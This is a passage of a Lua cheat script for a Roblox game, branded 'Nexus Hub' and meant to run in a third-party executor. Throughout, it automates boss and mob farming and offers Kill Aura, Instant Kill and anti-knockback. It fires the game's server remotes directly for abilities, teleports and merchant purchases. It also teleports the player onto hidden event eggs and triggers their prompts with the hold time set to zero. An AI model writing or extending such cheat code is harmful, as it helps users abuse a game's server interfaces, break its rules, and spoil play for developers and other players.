                    V = Enum.KeyCode.V,
                    F = Enum.KeyCode.F,
                }
                local toolType = GetToolTypeFromModule(tool.Name)
                local selected = Options.SelectedSkills or {}

                for _, key in ipairs({
                    'Z',
                    'X',
                    'C',
                    'V',
                    'F',
                })do
                    if selected[key] and IsSkillReady(key) then
                        pcall(function()
                            if toolType == 'Power' then
                                Remotes.UseFruit:FireServer('UseAbility', {
                                    FruitPower = tool.Name:gsub(' Fruit', ''),
                                    KeyCode = keyToEnum[key],
                                })
                            else
                                Remotes.UseSkill:FireServer(keyToSlot[key])
                            end
                        end)
                        task.wait(0.1)
                    end
                end
            end
        end

        return true
    end
    local function FarmBossForMapPieces()
        local _, cur, max = GetQuestStage()

        cur = cur or 0
        max = max or 7

        local lastSummonTick = {}
        local lastIslandTP = {}
        local lastNotifTick = 0
        local lastPieceCount = cur
        local bossIdx = 1
        local bossKillCount = {}
        local bossDropped = {}
        local MAX_KILLS_BEFORE_SKIP = 20

        for _, e in ipairs(MapPieceBosses)do
            bossKillCount[e.label] = 0
            bossDropped[e.label] = false
        end

        local function IsBossSkipped(entry)
            return bossDropped[entry.label] == true
        end
        local function AllBossesSkipped()
            for _, e in ipairs(MapPieceBosses)do
                if not IsBossSkipped(e) then
                    return false
                end
            end

            return true
        end
        local function ResetSkips()
            for _, e in ipairs(MapPieceBosses)do
                bossDropped[e.label] = false
                bossKillCount[e.label] = 0
            end
        end
        local function OnBossKilled(entry, piecesAfter)
            local dropped = piecesAfter > lastPieceCount

            bossKillCount[entry.label] = bossKillCount[entry.label] + 1

            if dropped then
                bossDropped[entry.label] = true
                lastPieceCount = piecesAfter
            elseif bossKillCount[entry.label] >= MAX_KILLS_BEFORE_SKIP then
                bossDropped[entry.label] = true
            end
        end

        while Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value do
            task.wait(0.05)

            local stage, newCur, newMax = GetQuestStage()

            if stage ~= 'mappieces' then
                return
            end

            newCur = newCur or 0
            newMax = newMax or 7

            if newMax > 0 and newCur >= newMax then
                return
            end
            if AllBossesSkipped() then
                ResetSkips()
            end
            if tick() - lastNotifTick >= 8 then
                local entry = MapPieceBosses[bossIdx]
                local skipStr = IsBossSkipped(entry) and ' [SKIPPED]' or ''

                lastNotifTick = tick()
            end

            local function GetNextValidIdx(startIdx)
                for i = 1, #MapPieceBosses do
                    local idx = ((startIdx + i - 2) % #MapPieceBosses) + 1

                    if not IsBossSkipped(MapPieceBosses[idx]) then
                        return idx
                    end
                end

                return startIdx
            end

            if IsBossSkipped(MapPieceBosses[bossIdx]) then
                bossIdx = GetNextValidIdx(bossIdx)
            end

            local attackedSomething = false

            for i = 1, #MapPieceBosses do
                local idx = ((bossIdx + i - 2) % #MapPieceBosses) + 1
                local entry = MapPieceBosses[idx]

                if IsBossSkipped(entry) then
                    continue
                end

                local live = FindLiveBoss(entry.match)

                if live then
                    local hpBefore = (live:FindFirstChildOfClass('Humanoid') or {}).Health or 0

                    AttackBoss(live, entry.island)

                    bossIdx = idx
                    attackedSomething = true

                    local hpAfter = 0
                    local h2 = live:FindFirstChildOfClass('Humanoid')

                    if h2 then
                        hpAfter = h2.Health
                    end
                    if hpAfter <= 0 or not live.Parent then
                        task.wait(1.5)

                        local _, afterCur = GetQuestStage()

                        afterCur = afterCur or newCur

                        OnBossKilled(entry, afterCur)

                        newCur = afterCur
                    end

                    break
                end
            end

            if not attackedSomething then
                local entry = MapPieceBosses[bossIdx]

                if IsBossSkipped(entry) then
                    bossIdx = GetNextValidIdx(bossIdx)

                    task.wait(0.1)

                    continue
                end
                if entry.summon then
                    local ik = entry.island

                    if not lastIslandTP[ik] or tick() - lastIslandTP[ik] >= 8 then
                        lastIslandTP[ik] = tick()

                        if Remotes.TP_Portal then
                            Remotes.TP_Portal:FireServer(ik)
                            task.wait(2.5)
                        end
                    end

                    local lk = entry.label

                    if not lastSummonTick[lk] or tick() - lastSummonTick[lk] >= 6 then
                        lastSummonTick[lk] = tick()

                        entry.summon()
                        task.wait(3)
                    else
                        task.wait(0.3)
                    end

                    local live2 = FindLiveBoss(entry.match)

                    if live2 then
                        local hpBefore = (live2:FindFirstChildOfClass('Humanoid') or {}).Health or 0

                        AttackBoss(live2, entry.island)
                        task.wait(0.5)

                        local h2 = live2:FindFirstChildOfClass('Humanoid')
                        local hpAfter = h2 and h2.Health or 0

                        if hpAfter <= 0 or not live2.Parent then
                            task.wait(1.5)

                            local _, afterCur = GetQuestStage()

                            afterCur = afterCur or newCur

                            OnBossKilled(entry, afterCur)
                        end
                    end
                else
                    local ik = entry.island

                    if not lastIslandTP[ik] or tick() - lastIslandTP[ik] >= 12 then
                        lastIslandTP[ik] = tick()

                        if Remotes.TP_Portal then
                            Remotes.TP_Portal:FireServer(ik)
                            task.wait(2.5)
                        end
                    end

                    local live2 = FindLiveBoss(entry.match)

                    if live2 then
                        AttackBoss(live2, entry.island)
                        task.wait(0.5)

                        local h2 = live2:FindFirstChildOfClass('Humanoid')

                        if (h2 and h2.Health <= 0) or not live2.Parent then
                            task.wait(1.5)

                            local _, afterCur = GetQuestStage()

                            afterCur = afterCur or newCur

                            OnBossKilled(entry, afterCur)
                        end
                    else
                        bossIdx = GetNextValidIdx(bossIdx + 1)

                        task.wait(0.2)
                    end
                end
                if not FindLiveBoss(entry.match) and not IsBossSkipped(entry) then
                    bossIdx = GetNextValidIdx(bossIdx + 1)
                end
            end
        end
    end

    while Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value do
        local questNPC = GetQuestNPC()

        if not questNPC then
            if Toggles.AutoSecondSea then
                Toggles.AutoSecondSea.Value = false
            end

            return
        end

        InteractNPC(questNPC)
        task.wait(1)

        if not IsQuestVisible() then
            Notify('Quest not active. Retrying NPC...')
            task.wait(1)
            InteractNPC(questNPC)
            task.wait(1)
        end

        local stage, cur, max, visible = GetQuestStage()

        if stage == 'fragments' or stage == '' or stage == nil then
            local sweepTimer = tick()

            while Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value do
                local s = GetQuestStage()

                if s == 'mappieces' then
                    break
                end

                SweepAllIslands()

                if tick() - sweepTimer > 60 then
                    sweepTimer = tick()
                    questNPC = GetQuestNPC()

                    if questNPC then
                        InteractNPC(questNPC)
                    end

                    task.wait(1)
                end

                task.wait(0.3)
            end
        end
        if not (Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value) then
            break
        end

        stage = GetQuestStage()

        if stage == 'mappieces' then
            FarmBossForMapPieces()
        end
        if not (Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value) then
            break
        end
        if Remotes.TP_Portal then
            Remotes.TP_Portal:FireServer('Starter')
            task.wait(2)
        end

        questNPC = GetQuestNPC()

        if questNPC then
            InteractNPC(questNPC)
            task.wait(0.8)
            InteractNPC(questNPC)
            task.wait(1)
        end

        task.wait(3)
    end
end

table.sort(Tables.AllBossList)
table.sort(Tables.BossList)
table.sort(Tables.TraitList)
table.sort(Tables.RaceList)
table.sort(Tables.ClanList)
table.sort(Tables.SummonList)
UpdateNPCLists()
UpdateAllEntities()

local executorDisplayName = identifyexecutor and identifyexecutor() or 'Unknown'
local statusText = isLimitedExecutor and 'Semi-Working - [low Executor Detected Some Features might not work!]' or 'Working [Supported]'
local InfoTab = CreateNexusPage({Name = 'Info'})

local InfoGroup = InfoTab:AddGroup({Name = 'Welcome'})
InfoGroup:AddLabel({Text = 'Hello, ' .. game.Players.LocalPlayer.Name .. '!'})
InfoGroup:AddLabel({Text = game.Players.LocalPlayer.Name .. ' - Nexus Hub'})

local ServerGroup = InfoTab:AddGroup({Name = 'Server'})
local _lbl_players = ServerGroup:AddLabel({Text = 'Players: ' .. tostring(#game:GetService('Players'):GetPlayers()) .. '/' .. tostring(game:GetService('Players').MaxPlayers)})
local _lbl_latency = ServerGroup:AddLabel({Text = 'Latency: ...'})
local _lbl_region = ServerGroup:AddLabel({Text = 'User Region: detecting...'})
local _lbl_uptime = ServerGroup:AddLabel({Text = 'In server for: 0h 00m 00s'})
ServerGroup:AddLabel({Text = 'Executor: ' .. executorDisplayName})
ServerGroup:AddLabel({Text = statusText})
ServerGroup:AddButton({
    Name = 'Tap to join the Discord Server',
    Text = 'Tap to join the Discord Server',
    Callback = function()
        setclipboard('https://discord.gg/raservices')
    end,
})

local _serverJoinTick = tick()
task.spawn(function()
    while task.wait(1) do
        pcall(function()
            local elapsed = math.floor(tick() - _serverJoinTick)
            local h = math.floor(elapsed / 3600)
            local m = math.floor((elapsed % 3600) / 60)
            local s = elapsed % 60
            if _lbl_uptime then
                _lbl_uptime.Text = string.format('In server for: %dh %02dm %02ds', h, m, s)
            end
            if _lbl_players then
                _lbl_players.Text = 'Players: ' .. tostring(#game:GetService('Players'):GetPlayers()) .. '/' .. tostring(game:GetService('Players').MaxPlayers)
            end
            if _lbl_latency then
                local ping = math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
                _lbl_latency.Text = 'Latency: ' .. tostring(ping) .. 'ms'
            end
        end)
    end
end)

local UserRegionByCountryCode = {
    US = 'North America',
    CA = 'North America',
    MX = 'North America',
    BR = 'South America',
    AR = 'South America',
    CL = 'South America',
    CO = 'South America',
    PE = 'South America',
    VE = 'South America',
    GB = 'Europe',
    IE = 'Europe',
    FR = 'Europe',
    DE = 'Europe',
    IT = 'Europe',
    ES = 'Europe',
    PT = 'Europe',
    NL = 'Europe',
    BE = 'Europe',
    CH = 'Europe',
    AT = 'Europe',
    SE = 'Europe',
    NO = 'Europe',
    DK = 'Europe',
    FI = 'Europe',
    PL = 'Europe',
    CZ = 'Europe',
    RO = 'Europe',
    GR = 'Europe',
    TR = 'Middle East',
    SA = 'Middle East',
    AE = 'Middle East',
    IL = 'Middle East',
    QA = 'Middle East',
    KW = 'Middle East',
    IN = 'South Asia',
    PK = 'South Asia',
    BD = 'South Asia',
    LK = 'South Asia',
    NP = 'South Asia',
    CN = 'East Asia',
    JP = 'East Asia',
    KR = 'East Asia',
    HK = 'East Asia',
    TW = 'East Asia',
    SG = 'Southeast Asia',
    MY = 'Southeast Asia',
    ID = 'Southeast Asia',
    PH = 'Southeast Asia',
    TH = 'Southeast Asia',
    VN = 'Southeast Asia',
    AU = 'Oceania',
    NZ = 'Oceania',
    ZA = 'Africa',
    NG = 'Africa',
    EG = 'Africa',
    MA = 'Africa',
    KE = 'Africa',
}

local function GetLocaleCountryCode()
    local locale

    pcall(function()
        locale = LocalizationService.RobloxLocaleId or LocalizationService.SystemLocaleId
    end)

    if type(locale) ~= 'string' then
        return nil
    end

    local code = locale:match('%-([A-Za-z][A-Za-z])$') or locale:match('_([A-Za-z][A-Za-z])$')

    return code and code:upper() or nil
end

local function GetUserRegionText()
    local countryCode

    pcall(function()
        countryCode = LocalizationService:GetCountryRegionForPlayerAsync(Plr)
    end)

    if type(countryCode) ~= 'string' or countryCode == '' then
        countryCode = GetLocaleCountryCode()
    end

    if type(countryCode) ~= 'string' or countryCode == '' then
        return 'Unknown'
    end

    countryCode = countryCode:upper()

    local region = UserRegionByCountryCode[countryCode]

    if region then
        return region .. ' (' .. countryCode .. ')'
    end

    return countryCode
end

task.spawn(function()
    pcall(function()
        if _lbl_region then
            _lbl_region.Text = 'User Region: ' .. GetUserRegionText()
        end
    end)
end)

local PriorityOptions = {
    'Nearest Mob',
    'Level Farm',
    'Mob',
    'All Mob Farm',
    'Boss',
    'Pity Boss',
    'Summon',
    'Merchant',
    'Alt Help',
    'Sea Boss',
}

Options.SelectedPriorities = {}
DefaultPriority = {}

for _, priorityName in ipairs(PriorityOptions)do
    Options.SelectedPriorities[priorityName] = true
    table.insert(DefaultPriority, priorityName)
end

local FarmConfigTab = CreateNexusPage({Name = 'Farm Config'})

function Func_AutoEquipWeapon()
    while Toggles.AutoEquipWeapon and Toggles.AutoEquipWeapon.Value do
        task.wait(0.5)
        EquipWeapon()
    end
end

FarmConfigTab_group = FarmConfigTab:AddGroup({Name = 'Weapon Settings'})

Options.SelectedWeaponType = {Melee = true}

FarmConfigTab_group:AddMultiDropdown({
    Name = 'Select Weapon (can be multi)',
    Options = Tables.Weapon,
    Default = {
        'Melee',
    },
        Flag = 'SelectedWeaponType',
    Callback = function(v)
        local map = {}
        if type(v) == 'table' then
            for k, val in pairs(v)do
                if type(k) == 'number' then
                    map[val] = true
                else
                    map[k] = true
                end
            end
        else
            map[v] = true
        end
        Options.SelectedWeaponType = map
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Auto Equip Weapon',
    Default = false,
    Flag = 'AutoEquipWeapon',
    Callback = function(v)
        Toggles.AutoEquipWeapon = {Value = v}

        Thread('AutoEquipWeapon', SafeLoop('Auto Equip Weapon', Func_AutoEquipWeapon), v)
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Auto Attack M1',
    Default = false,
    Flag = 'AutoM1',
    Callback = function(v)
        Toggles.AutoM1 = {Value = v}
    end,
})
FarmConfigTab_group:AddSlider({
    Name = 'Weapon Switch Delay',
    Min = 1,
    Max = 20,
    Default = 4,
    Flag = 'SwitchWeaponCD',
    Callback = function(v)
        Options.SwitchWeaponCD = v
    end,
})
FarmConfigTab_group = FarmConfigTab:AddGroup({Name = 'Kill Aura'})
FarmConfigTab_group:AddSlider({
    Name = 'Kill Aura Range',
    Min = 10,
    Max = 500,
    Default = 200,
    Flag = 'KillAuraRange',
    Callback = function(v)
        Options.KillAuraRange = v
    end,
})
FarmConfigTab_group:AddSlider({
    Name = 'Kill Aura CD',
    Min = 0.05,
    Max = 2,
    Default = 0.12,
    Flag = 'KillAuraCD',
    Callback = function(v)
        Options.KillAuraCD = v
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Kill Aura',
    Default = false,
    Flag = 'KillAura',
    Callback = function(v)
        Toggles.KillAura = {Value = v}

        Thread('KillAura', SafeLoop('Kill Aura', Func_KillAura), v)
    end,
})
FarmConfigTab_group = FarmConfigTab:AddGroup({Name = 'Instant Kill'})
FarmConfigTab_group:AddSlider({
    Name = 'InstaKill Min HP',
    Min = 0,
    Max = 1000000,
    Default = 500000,
    Flag = 'InstaKillMinHP',
    Callback = function(v)
        Options.InstaKillMinHP = v
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Instant Kill',
    Default = false,
    Flag = 'InstaKill',
    Callback = function(v)
        Toggles.InstaKill = {Value = v}
        Options.M1Speed = v and 0.05 or 0.15
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Anti Stun/ Knockback',
    Default = false,
    Flag = 'AntiKnockback',
    Callback = function(v)
        Toggles.AntiKnockback = {Value = v}

        if v then
            Func_AntiKnockback()
        end
    end,
})
FarmConfigTab_group = FarmConfigTab:AddGroup({Name = 'Movement'})
FarmConfigTab_group:AddDropdown({
    Name = 'Movement Type',
    Options = {
        'Teleport',
        'Tween',
    },
    Default = 'Teleport',
    Flag = 'SelectedMovementType',
    Callback = function(v)
        Options.SelectedMovementType = v
    end,
})
FarmConfigTab_group:AddDropdown({
    Name = 'Farm Position',
    Options = {
        'Behind',
        'Above',
        'Below',
    },
    Default = 'Behind',
    Flag = 'SelectedFarmType',
    Callback = function(v)
        Options.SelectedFarmType = v
    end,
})
FarmConfigTab_group:AddSlider({
    Name = 'Farm Distance',
    Min = 0,
    Max = 30,
    Default = 5,
    Flag = 'Distance',
    Callback = function(v)
        Options.Distance = v
    end,
})
FarmConfigTab_group:AddSlider({
    Name = 'Tween Speed',
    Min = 0,
    Max = 500,
    Default = 160,
    Flag = 'TweenSpeed',
    Callback = function(v)
        Options.TweenSpeed = v
    end,
})
FarmConfigTab_group = FarmConfigTab:AddGroup({Name = 'Haki Settings'})
FarmConfigTab_group:AddToggle({
    Name = 'Auto Activate Observation Haki',
    Default = false,
    Flag = 'ObserHaki',
    Callback = function(v)
        Toggles.ObserHaki = {Value = v}

        Thread('AutoHaki.Obser', Func_AutoHaki, (Toggles.ObserHaki and Toggles.ObserHaki.Value) or (Toggles.ArmHaki and Toggles.ArmHaki.Value) or (Toggles.ConquerorHaki and Toggles.ConquerorHaki.Value))
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Auto Activate Armament Haki',
    Default = false,
    Flag = 'ArmHaki',
    Callback = function(v)
        Toggles.ArmHaki = {Value = v}

        Thread('AutoHaki.Obser', Func_AutoHaki, (Toggles.ObserHaki and Toggles.ObserHaki.Value) or (Toggles.ArmHaki and Toggles.ArmHaki.Value) or (Toggles.ConquerorHaki and Toggles.ConquerorHaki.Value))
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Auto Activate Conqueror Haki',
    Default = false,
    Flag = 'ConquerorHaki',
    Callback = function(v)
        Toggles.ConquerorHaki = {Value = v}

        Thread('AutoHaki.Obser', Func_AutoHaki, (Toggles.ObserHaki and Toggles.ObserHaki.Value) or (Toggles.ArmHaki and Toggles.ArmHaki.Value) or (Toggles.ConquerorHaki and Toggles.ConquerorHaki.Value))
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Target Only (Conqueror)',
    Default = false,
    Flag = 'OnlyTarget',
    Callback = function(v)
        Toggles.OnlyTarget = {Value = v}
    end,
})
FarmConfigTab_group = FarmConfigTab:AddGroup({Name = 'Auto Skill'})
FarmConfigTab_group:AddMultiDropdown({
    Name = 'Select Skills',
    Options = {
        'Z',
        'X',
        'C',
        'V',
        'F',
    },
    Default = {
        'Z',
    },
        Flag = 'SelectedSkills',
    Callback = function(v)
        Options.SelectedSkills = ToSet(v)
    end,
})

Options.SelectedSkills = {Z = true}

FarmConfigTab_group:AddDropdown({
    Name = 'Skill Mode',
    Options = {
        'Normal',
        'Instant',
    },
    Default = 'Normal',
    Flag = 'AutoSkillType',
    Callback = function(v)
        Options.AutoSkillType = v
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Auto skill Boss Only',
    Default = false,
    Flag = 'AutoSkill_BossOnly',
    Callback = function(v)
        Toggles.AutoSkill_BossOnly = {Value = v}
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Auto Use Skills',
    Default = false,
    Flag = 'AutoSkill',
    Callback = function(v)
        Toggles.AutoSkill = {Value = v}

        Thread('AutoSkill', SafeLoop('Auto Skill', Func_AutoSkill), v)
    end,
})
FarmConfigTab_group = FarmConfigTab:AddGroup({Name = 'Auto Combo'})
FarmConfigTab_group:AddTextInput({
    Name = 'Combo Pattern',
    Default = 'Z > X > C > V > F',
    Placeholder = 'combo pattern..',
    Flag = 'ComboPattern',
    Callback = function(v)
        Options.ComboPattern = v
    end,
})
FarmConfigTab_group:AddDropdown({
    Name = 'Combo Mode',
    Options = {
        'Normal',
        'Instant',
    },
    Default = 'Normal',
    Flag = 'ComboMode',
    Callback = function(v)
        Options.ComboMode = v
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Boss Only',
    Default = false,
    Flag = 'ComboBossOnly',
    Callback = function(v)
        Toggles.ComboBossOnly = {Value = v}
    end,
})
FarmConfigTab_group:AddToggle({
    Name = 'Auto Skill Combo',
    Default = false,
    Flag = 'AutoCombo',
    Callback = function(v)
        Toggles.AutoCombo = {Value = v}

        if v and Toggles.AutoSkill and Toggles.AutoSkill.Value then
            Toggles.AutoSkill.Value = false

            UI:Notify({
                Title = 'Notice',
                Description = 'Auto Skill disabled \u{2014} conflicts with combo.',
                Duration = 3,
            })
        end
        if not v then
            Shared.ComboIdx = 1
        end

        Thread('AutoCombo', SafeLoop('Skill Combo', Func_AutoCombo), v)
    end,
})

local mainfarm = CreateNexusPage({Name = 'Level Farm'})

mainfarm_group = mainfarm:AddGroup({Name = 'Main Farm'})

local FarmStatus = mainfarm_group:AddLabel({Text = 'Mob: Idle\nHP: --\nQuest: --', Wrap = true})

mainfarm_group:AddToggle({
    Name = 'Auto Farm Level',
    Default = false,
    Flag = 'LevelFarm',
    Callback = function(v)
        Toggles.LevelFarm = {Value = v}

        if not v then
            Shared.QuestNPC = ''
        end
    end,
})
mainfarm_group:AddToggle({
    Name = 'Auto Second Sea (Fully)',
    Default = false,
    Flag = 'AutoSecondSea',
    Callback = function(v)
        Toggles.AutoSecondSea = {Value = v}

        Thread('AutoSecondSea', SafeLoop('Auto Second Sea', Func_AutoSecondSea), v)
    end,
})
mainfarm_group:AddToggle({
    Name = 'Auto Farm Nearest Mob',
    Default = false,
    Flag = 'NearestMobFarm',
    Callback = function(v)
        Toggles.NearestMobFarm = {Value = v}
    end,
})
mainfarm_group:AddSlider({
    Name = 'Nearest Farm Radius',
    Min = 100,
    Max = 1000,
    Default = 500,
    Flag = 'MobFarmRadius',
    Callback = function(v)
        Options.MobFarmRadius = v
    end,
})
mainfarm_group = mainfarm:AddGroup({Name = 'Mob Farm'})
mainfarm_group:AddMultiDropdown({
    Name = 'Select Mob(s)',
    Options = Tables.MobList,
    Default = Tables.MobList[1] and {Tables.MobList[1]} or {},
        Flag = 'SelectedMob',
    Callback = function(v)
        Options.SelectedMob = ToSet(v)
    end,
})

Options.SelectedMob = Tables.MobList[1] and {
    [Tables.MobList[1]] = true,
} or {}

mainfarm_group:AddButton({
    Name = 'Refresh Mob List',
    Callback = function()
        UpdateNPCLists()
        UI:Notify({
            Title = 'Refreshed',
            Description = 'Mob list updated.',
            Duration = 2,
        })
    end,
})
mainfarm_group:AddToggle({
    Name = 'Autofarm Selected Mob',
    Default = false,
    Flag = 'MobFarm',
    Callback = function(v)
        Toggles.MobFarm = {Value = v}

        if not v then
            Shared.MobIdx = 1
        end
    end,
})
mainfarm_group:AddToggle({
    Name = 'Autofarm All Mobs',
    Default = false,
    Flag = 'AllMobFarm',
    Callback = function(v)
        Toggles.AllMobFarm = {Value = v}
    end,
})

local easterupdate = CreateNexusPage({Name = 'Easter Event'})
local EasterMerchantStock = {}
local EasterMerchantItemNames = {}

local function SyncEasterMerchantStock()
    table.clear(EasterMerchantStock)
    table.clear(EasterMerchantItemNames)

    local merchantUI = PGui:FindFirstChild('EasterMerchantUI')

    if not merchantUI then
        return
    end

    local holder = merchantUI:FindFirstChild('Holder', true)

    if not holder then
        return
    end

    for _, child in pairs(holder:GetChildren())do
        if not (child:IsA('Frame') or child:IsA('ImageButton') or child:IsA('TextButton')) then
            continue
        end

        local itemName = nil
        local stock = 0

        for _, desc in pairs(child:GetDescendants())do
            if desc:IsA('TextLabel') and desc.Text ~= '' then
                local t = desc.Text

                if not t:match('^%d+$') and not t:lower():find('stock') and not t:lower():find('cost') then
                    if not itemName or #t > #itemName then
                        itemName = t
                    end
                end
            end
        end
        for _, desc in pairs(child:GetDescendants())do
            if desc:IsA('TextLabel') then
                local t = desc.Text

                if t == '\u{221e}' or t:lower():find('inf') then
                    stock = 999

                    break
                end

                local n = tonumber(t:match('%d+'))

                if n and n ~= tonumber(itemName) then
                    stock = n
                end
            end
        end

        if itemName and itemName ~= '' then
            EasterMerchantStock[itemName] = stock

            if not table.find(EasterMerchantItemNames, itemName) then
                table.insert(EasterMerchantItemNames, itemName)
            end
        end
    end
end
local function OpenEasterMerchantUI()
    pcall(function()
        local openRemote = GetRemote(RS, 'Remotes.EasterMerchantRemotes.OpenEasterMerchantUI')

        if openRemote then
            openRemote:FireServer()
        end
    end)
    task.wait(0.3)
    pcall(function()
        local openShop = GetRemote(RS, 'RemoteEvents.OpenEasterShop')

        if openShop then
            openShop:FireServer()
        end
    end)
    task.wait(0.3)
    pcall(function()
        local openRemote = GetRemote(RS, 'Remotes.EasterMerchantRemotes.OpenEasterMerchantUI')

        if openRemote then
            if firesignal then
                firesignal(openRemote.OnClientEvent)
            elseif getconnections then
                for _, v in pairs(getconnections(openRemote.OnClientEvent))do
                    if v.Function then
                        task.spawn(v.Function)
                    end
                end
            end
        end
    end)
    task.wait(0.3)
    pcall(function()
        local shopSync = GetRemote(RS, 'RemoteEvents.EasterShopSync')

        if shopSync then
            if firesignal then
                firesignal(shopSync.OnClientEvent)
            elseif getconnections then
                for _, v in pairs(getconnections(shopSync.OnClientEvent))do
                    if v.Function then
                        task.spawn(v.Function)
                    end
                end
            end
        end
    end)
    task.wait(0.5)
    SyncEasterMerchantStock()
end
local function BuyEasterItem(itemName, qty)
    local bought = false

    qty = qty or 1

    local purchaseRemote = GetRemote(RS, 'Remotes.EasterMerchantRemotes.PurchaseEasterMerchantItem')

    if purchaseRemote then
        local ok = pcall(function()
            purchaseRemote:InvokeServer(itemName, qty)
        end)

        if not ok then
            ok = pcall(function()
                purchaseRemote:FireServer(itemName, qty)
            end)
        end

        bought = ok
    end
    if not bought then
        local merchantUI = PGui:FindFirstChild('EasterMerchantUI')
        local holder = merchantUI and merchantUI:FindFirstChild('Holder', true)

        if holder then
            for _, child in pairs(holder:GetChildren())do
                local foundName = false

                for _, desc in pairs(child:GetDescendants())do
                    if desc:IsA('TextLabel') and desc.Text == itemName then
                        foundName = true

                        break
                    end
                end

                if foundName then
                    local btn = child:FindFirstChildWhichIsA('TextButton', true) or child:FindFirstChildWhichIsA('ImageButton', true)

                    if btn then
                        bought = gsc(btn)

                        if not bought then
                            pcall(function()
                                btn.MouseButton1Click:Fire()
                            end)

                            bought = true
                        end
                    end

                    break
                end
            end
        end
    end
    if not bought then
        pcall(function()
            local upgradeRemote = GetRemote(RS, 'Remotes.EasterMerchantRemotes.RequestEasterUpgrade')

            if upgradeRemote then
                upgradeRemote:FireServer(itemName, qty)

                bought = true
            end
        end)
    end
    if not bought then
        if Remotes.ValentineBuy then
            pcall(function()
                Remotes.ValentineBuy:FireServer(itemName, qty)
            end)

            bought = true
        elseif Remotes.MerchantBuy then
            pcall(function()
                Remotes.MerchantBuy:InvokeServer(itemName, qty)
            end)

            bought = true
        end
    end

    return bought
end

function Func_AutoEasterMerchant()
    local function Notify(msg)
        UI:Notify({
            Title = 'Easter Merchant',
            Description = msg,
            Duration = 4,
        })
    end

    OpenEasterMerchantUI()
    task.wait(1)
    SyncEasterMerchantStock()

    if #EasterMerchantItemNames > 0 and EasterMerchDropdown then
        pcall(function()
            EasterMerchDropdown:UpdateOptions(EasterMerchantItemNames)
        end)
    end

    while Toggles.AutoEasterMerchant and Toggles.AutoEasterMerchant.Value do
        OpenEasterMerchantUI()
        task.wait(1)
        SyncEasterMerchantStock()

        local sel = Options.SelectedEasterItems or {}
        local toBuy = {}
        local hasSelection = false

        for _, v in pairs(sel)do
            if v then
                hasSelection = true

                break
            end
        end

        if hasSelection then
            for _, name in ipairs(EasterMerchantItemNames)do
                if sel[name] then
                    table.insert(toBuy, name)
                end
            end
        else
            for _, name in ipairs(EasterMerchantItemNames)do
                table.insert(toBuy, name)
            end
        end

        local bought = 0

        for _, itemName in ipairs(toBuy)do
            if not (Toggles.AutoEasterMerchant and Toggles.AutoEasterMerchant.Value) then
                break
            end

            local stock = EasterMerchantStock[itemName] or 0

            if stock == 0 then
                continue
            end

            local qty = (stock == 999) and 1 or stock
            local ok = BuyEasterItem(itemName, qty)

            if ok then
                bought = bought + 1
            end

            task.wait(1.2)
        end

        local merchantUI = PGui:FindFirstChild('EasterMerchantUI')

        if merchantUI then
            local mf = merchantUI:FindFirstChild('MainFrame')

            if mf then
                mf.Visible = false
            end
        end

        local waitSec = 35
        local timerLbl = merchantUI and merchantUI:FindFirstChild('RefreshTimerLabel', true)

        if timerLbl and timerLbl.Text ~= '' then
            local s = GetSecondsFromTimer(timerLbl.Text)

            if s and s > 2 then
                waitSec = s + 2
            end
        end

        local elapsed = 0

        while elapsed < waitSec and Toggles.AutoEasterMerchant and Toggles.AutoEasterMerchant.Value do
            task.wait(1)

            elapsed = elapsed + 1
        end
    end
end

local function GetAllHiddenEggs()
    local eggs = {}
    local easterFolder = workspace:FindFirstChild('EasterEggs')

    if not easterFolder then
        return eggs
    end

    for _, child in pairs(easterFolder:GetChildren())do
        if child.Name:match('^EasterEgg_HiddenEgg') or child.Name:match('^EasterEgg_TimedEgg') or child.Name:match('^EasterEgg_BossEgg') then
            table.insert(eggs, child)
        end
    end

    return eggs
end
local function GetEggPosition(egg)
    local ok, piv = pcall(function()
        return egg:GetPivot()
    end)

    if ok and piv then
        return piv.Position
    end

    for _, desc in pairs(egg:GetDescendants())do
        if desc:IsA('BasePart') then
            return desc.Position
        end
    end

    if egg:IsA('BasePart') then
        return egg.Position
    end

    return nil
end
local function GetEasterQuestProgress()
    local cur, max = 0, 0
    local QuestUI = PGui:FindFirstChild('QuestUI')

    if not QuestUI then
        return cur, max
    end

    for _, lbl in pairs(QuestUI:GetDescendants())do
        if lbl:IsA('TextLabel') and lbl.Text ~= '' then
            local c, m = lbl.Text:match('(%d+)%s*/%s*(%d+)')

            if c and m then
                cur = tonumber(c) or 0
                max = tonumber(m) or 0

                if max > 0 then
                    break
                end
            end
        end
    end

    return cur, max
end
local function IsEasterQuestVisible()
    local QuestUI = PGui:FindFirstChild('QuestUI')

    if not QuestUI then
        return false
    end

    local questFrame = QuestUI:FindFirstChild('Quest')

    if questFrame then
        local inner = questFrame:FindFirstChild('Quest', true)

        if inner then
            return inner.Visible
        end

        return questFrame.Visible
    end

    return false
end

local CollectedEggIds = {}

local function GetUncollectedEggs()
    local all = GetAllHiddenEggs()
    local result = {}

    for _, egg in ipairs(all)do
        if egg and egg.Parent and not CollectedEggIds[egg] then
            table.insert(result, egg)
        end
    end

    return result
end
local function CollectEgg(egg, root)
    if not egg or not egg.Parent then
        return false
    end

    local pos = GetEggPosition(egg)

    if not pos then
        return false
    end

    root.CFrame = CFrame.new(pos + Vector3.new(0, 2, 0))
    root.AssemblyLinearVelocity = Vector3.zero

    task.wait(0.3)

    for _, desc in pairs(egg:GetDescendants())do
        if desc:IsA('ProximityPrompt') then
            pcall(function()
                desc.HoldDuration = 0

                fireproximityprompt(desc)
            end)
            task.wait(0.3)
        end
    end
    for _, desc in pairs(egg:GetDescendants())do
        if desc:IsA('ClickDetector') then
            pcall(function()
                fireclickdetector(desc)
            end)
